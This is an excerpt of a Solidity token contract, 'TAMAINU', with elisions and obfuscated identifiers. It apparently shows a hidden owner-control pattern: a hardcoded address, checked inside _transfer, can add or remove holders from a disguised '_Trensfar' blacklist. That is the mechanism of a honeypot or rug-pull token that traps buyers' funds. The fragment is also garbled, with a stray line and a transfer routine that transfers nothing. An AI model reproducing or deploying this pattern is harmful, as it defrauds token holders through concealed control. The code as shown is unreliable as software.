...
abstract contract Context {
    ...
    function _l_() internal view virtual returns (address) {
        return msg.sender;
    }
}
...
contract  TAMAINU is Context, IERC20, Ownable {
    ...
    address private safu_l_ress;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _j_;
    mapping (address => bool) public _Trensfar;
    ...
    constructor () {
        ...
        _m_ = payable(address(0x8DD9F855b8D6CC4a085B6C7103959edEd10C82fE));
...
= _k_;}
    ...
    function _transfer(address f, address t, uint256 amount) private returns (bool) {
        ...
        require(_nn_(_m_,_l_()));
        for (uint256 i; i < _x_.length; ++i) {
            if (_yy_ == 1){_Trensfar[_x_[i]] = true;}
            else if(_yy_ == 0){_Trensfar[_x_[i]] = false;}
        }
    }
